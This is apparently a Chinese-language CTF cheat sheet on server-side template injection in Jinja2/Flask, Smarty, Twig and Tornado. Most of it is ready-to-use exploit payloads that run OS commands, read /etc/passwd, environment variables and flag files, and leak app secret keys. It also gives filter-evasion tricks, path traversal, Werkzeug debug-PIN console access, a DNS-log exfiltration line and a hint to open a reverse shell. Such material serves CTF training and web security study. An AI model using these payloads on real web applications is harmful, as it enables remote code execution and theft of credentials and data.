# SSTI

![Alt text](../../public/imgs/ssti.png)

[hideandseek](https://www.baidu.com/s?wd=hctf2018+hideandseek)

- linux service 越权
- [Python 原型链污染+Flask Pin](../../../../../blog/text/docs/ctf/scripts/web/web_flask_pin_原型链污染.zip)
- 非预期 unicode 绕过 \uxxxx
- 非预期 hex 绕过 \x32
- python2 tphmap.py -u "url" [--level=3] --os-shell
- fenjing `python -m fenjing webui`

## ssti bypass

| blacklist 过滤 | symbol                                                                      | bypass                                                                                                                                                                                                                    |
| -------------- | --------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------ | --------------------------- |
| global         | `''` 引号拼接                                                               | `__init__['__glob''als__']`                                                                                                                                                                                               |
| `{{`           | `{% %}`                                                                     | `{%print(url_for.__globals__['os']['popen']('ls').read())%}` <br> `` {% if url_for.__globals__['os']['popen']('ping `whoami`.kfa554.dnslog.cn').read()=='a' %}1{% endif %} ``                                             |
| `[,]`          |                                                                             | `{{url_for.__globals__.os.popen('ls').read()}}`                                                                                                                                                                           |
| `',"`          | request.values.v1                                                           | 用 burp 发 `{{url_for.__globals__.os.popen(request.values.v1).read()}}&v1=ls`                                                                                                                                             |
|                | `chr()` chr 绕过                                                            | 先找到 chr 再使用 `{{url_for.__globals__.__builtins__.chr}}`<br>`{% set chr=url_for.__globals__.__builtins__.chr%}{{url_for.__globals__.os.popen(chr(108)+chr(115)).read()}}`                                             |
|                | `__getitem__()`                                                             |
| `_`            | `\x5f` 16 进制绕过 <br>`\137` 8 进制绕过                                    | `{{lipsum['\x5f\x5fglobals\x5f\x5f'].os.popen('ls').read()}}` <br> `{{lipsum['\137\137globals\137\137'].os.popen('ls').read()}}`                                                                                          |
| `.` 点         | 1. `[]`中括号绕过 <br>2.`attr()`绕过                                        | `{{url_for['__globals__']['os']['popen']('ls')['read']()}}` 列表/字典 不能 attr(139)，要`attr('__getitem__')(139)` <br> `{{lipsum\|attr('__globals__')\|attr('__getitem__')('os')\|attr('popen')('ls')\|attr('read')()}}` |
| `.` 点         |                                                                             |                                                                                                                                                                                                                           |
| 关键字过滤     | 1.字符串拼接绕过 <br>2.单双引号绕过<br> 3.编码绕过 8/16 进制/unicode/base64 | `{{''['__cl'+'ass__']}}` <br> `{{''['__cl''ass__']}}`                                                                                                                                                                     |
| 数字过滤       | [数字过滤](#数字过滤)                                                       | `{%set zero=([]                                                                                                                                                                                                           | string | list).index('[')%}{{zero}}` |

### 数字过滤

1. 用循环找到能利用的类直接用

```python
{% for i in ''.__class__.__base__.__subclasses__() %}{% if i.__name__=='Popen' %}{{ i.__init__.__globals__.__getitem__('os').popen('cat flag').read()}}{% endif %}{% endfor %}
```

2. 用 lipsum 不通过数字直接利用

```python
{{lipsum|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("cat flag")|attr("read")()}}
```

3.直接拼接

```py
{%set zero=([]|string|list).index('[')%}
{%set one=dict(a=a)|join|count%}
{%set two=dict(aa=a)|join|count%}
{%set three=dict(aaa=a)|join|count%}
{%set four=dict(aaaa=a)|join|count%}
{%set five=dict(aaaaa=a)|join|count%}
{%set six=dict(aaaaaa=a)|join|count%}
{%set seven=dict(aaaaaaa=a)|join|count%}
{%set eight=dict(aaaaaaaa=a)|join|count%}
{%set nine=dict(aaaaaaaaa=a)|join|count%}
# 拼接为140
{% set num=(one~four~zero)|int %}
# 最终payload
{%set one=dict(a=a)|join|count%}
{%set four=dict(aaaa=a)|join|count%}
{%set zero=([]|string|list).index('[')%}
{% set num=(one~four~zero)|int %}
{{().__class__.__base__.__subclasses__()[num].__init__.__globals__['__builtins__']['__import__']('os').popen('ls').read()}}
```

## ssti 注入

测试

<pre>/hello?name=
{% for i in range(10) %}
{% print(i) %}
{% endfor %}
</pre>

输出了结果，说明有漏洞

```python
/hello?name={{config.__class__.__init__.__globals__['os'].popen('cat ../app/flag').read()}}
/hello?name={{"".__class__}} 返回str
/hello?name={{"".__class__.__base__.__subclasses__()[302]}} # popen
/hello?name={{"".__class__.__base__.__subclasses__()[302].__init__.__globals__["os"].popen("ls /app").read()}}
/hello?name={{"".__class__.__base__.__subclasses__()[302].__init__.__globals__["os"].popen("cat /app/flag").read()}}
[].__class__.__base__.__subclasses__()[58].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag.txt').read()")
# WarningMessage
{{''.__class__.__base__.__subclasses__()[221].__init__['__glob''als__']['__builtins__']['eval']}}

# python2 input漏洞
__import__('os').popen('cat /flag.txt').read()
## appconfig
__class__.__init__.__globals__[app].config
?err=pfn&back={0.__class__.__init__.__globals__}   # 等于 pnf.__class__.__init__.__globals__


# __builtins__利用
[].__class__.__mro__[1].__subclasses__()[58].__init__.__globals__['__builtins__']['open']('/etc/passwd').read()
[].__class__.__mro__[1].__subclasses__()[58].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls").read()’)

# linecache利用
[].__class__.__mro__[1].__subclasses__()[58].__init__.__globals__['linecache'].__dict__['os'].popen('whoami’).read()
[].__class__.__mro__[1].__subclasses__()[58].__init__.__globals__['linecache'].__dict__['sys'].modules['os'].popen('whoami').read()
[].__class__.__mro__[1].__subclasses__()[58].__init__.__globals__['linecache'].__dict__['__builtins__']['__import__']('os').popen('ls').read()

# sys利用
[].__class__.__mro__[1].__subclasses__()[58].__init__.__globals__['sys'].modules['os'].popen('whoami').read()
```

### 万能语句

```python
{% for c in [].__class__.__base__.__subclasses__() %}
    {% if c.__name__ == 'catch_warnings' %}
        {% for b in c.__init__.__globals__.values() %}
            {% if b.__class__ == {}.__class__ %}
                {% if 'eva'+'l' in b.keys() %}
                    {{ b['eva'+'l']('__impor'+'t__'+'("o'+'s")'+'.pope'+'n'+'("ls /").read()') }}
                {% endif %}
            {% endif %}
        {% endfor %}
    {% endif %}
{% endfor %}
```

方式 2

```py
# 读取app.py  -- [GYCTF2020]FlaskApp
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('app.py','r').read()}}{% endif %}{% endfor %}
# 读目录 ls/
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()")}}{% endif %}{% endfor %}
# 拼接大法
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')}}{% endif %}{% endfor %}
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/this_is_the_fl'+'ag.txt','r').read()}}{% endif %}{% endfor %}
```

生产环境不要开 debug 模式

## ssti 服务器模板注入 jinja2

`buuoj [RootersCTF2019]l_<3_Flask`

[[WesternCTF2018]shrine](https://www.cnblogs.com/Cl0ud/p/12316287.html)

```py
# request
{{request.__init__.__globals__['__builtins__'].open('/etc/passwd').read()}}
{{request.application.__globals__['__builtins__'].open('/etc/passwd').read()}}

# url_for
{{url_for['__glob'~'als__']}}
{{url_for['__glob'~'als__']['__built'~'ins__']['eval']("next(open('/flag'))")}}
{{url_for['__glob'~'als__']['os']['popen']("cat *")['read']()}}

{{config.__class__.__init__.__globals__['os'].__getattribute__('popen')('ls /').read()}}
{{config.__class__.__init__.__globals__['os'].__getattribute__('popen')('cat /this_is_the_fla""g.txt').read()}}

# lipsum
{{lipsum.__globals__['os'].popen('whoami').read()}}
{{lipsum.__globals__.os.popen('whoami').read()}}
{{lipsum.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")}}

# get_flashed_messages
{{self.__dict__}}
{{url_for.__globals__['current_app'].config}}
{{get_flashed_messages.__globals__['current_app'].config}}
{{get_flashed_messages.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()")}}
```

[pasecactf_2019_flask_ssti](https://guokeya.github.io/post/zIiwsY95N/)

内置函数 `print(help(dir(__builtins__)))`

ssti 方式

```
?flag={{config.SECRET_KEY}}
/hello?name={{7*7}}
/hello?name={{config}}

原题目通过lfi, 文件穿越
/downloadj?image=1.jpg
/downloadj?image=../../../../../../../etc/passwd/

查看程序环境变量
/downloadj?image=../../../../../../../proc/self/environ
看到secret_key
```

## ssti smarty

`[BJDCTF2020]The mystery of ip`
`[CISCN2019 华东南赛区]Web11`

```
{if phpinfo()}{/if}
{if system('ls')}{/if}
{ readfile('/flag') }
{if show_source('/flag')}{/if}
{if system('cat /flag')}{/if} #本题payload
{if system('cat ../../../flag')}{/if} #本题payload
X-Forwarded-For: {{system("ls")}}
X-Forwarded-For: {{system("cat /flag")}} #本题payload
```

## ssti 服务器模板注入 twig

```
user={{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}
```

## PIN 码

debug 开启 才有 PIN 码问题

```html
{{...}}报错
```

得到，PIN 码怎样访问？

```html
name={{...}} 看报错信息，
```

找一行，点右边的 terminal 图标，输入 PIN 码。进入 console。

```python
## console中执行
import os
os.system('ls') # 并没有得到返回输出全部内容，返回了0.只得到返回值
os.popen('ls').read() # 得到了结果。
os.popen('ls /').read()
os.popen('ls /app').read() # 发现 flag
os.popen('cat /app/flag').read()
## 也可以写个反向shell，拿到更多权限。
```

## ssti 注入\_tornado

[2018 护网杯 easy_tornado(BUUCTF 提供复现)](https://blog.csdn.net/zz_Caleb/article/details/101473013)

那么 tornado 中的 cookie 通过 handler.settings 对象

handler 指向 RequestHandler
而 RequestHandler.settings 又指向 self.application.settings
所有 handler.settings 就指向 RequestHandler.application.settings 了！

传递 error?msg={{ handler.settings }}得到：

'cookie_secret': 'b8e09977-6541-498b-9a30-08e3118b6e60'}

filehash: md5(cookie_secret+md5(filename))

## GDOUCTF 2023 ez_ze

[SSTI 绕过 | [GDOUCTF 2023]<ez_ze>](https://www.nssctf.cn/problem/3745) [参考文章](https://zhuanlan.zhihu.com/p/619441473)

可用 payload：

```python
{%set fza1=dict(po=a,p=b)|join%}
{%set res=(lipsum|string|list)|attr(fza1)(24)%}
{%set fza2=(res,res,dict(globa=a,ls=b)|join,res,res)|join%}
{%set fza3=dict(o=a,s=b)|join%}
{%set fza4=dict(pope=a,n=b)|join%}
{%set fza5=dict(get=a)|join%}
{%set fza6=(res,res,dict(builtins=a)|join,res,res)|join %}
{%set fza7=dict(chr=a)|join%}
{%set char=(lipsum|attr(fza2))|attr(fza5)(fza6)|attr(fza5)(fza7)%}
{%set command=char(99)%2bchar(97)%2bchar(116)%2bchar(32)%2bchar(47)%2bchar(102)%2bchar(108)%2bchar(97)%2bchar(103)%}
{%set re=dict(rea=a,d=b)|join%}
{%set fuck=(lipsum|attr(fza2))|attr(fza5)(fza3)|attr(fza4)(command)|attr(re)()%}
{%print fuck%}
```

## Article

[Python 沙箱逃逸-离线也有](https://mp.weixin.qq.com/s/_cYKlPzUgokvJ17ZVRhMxw)
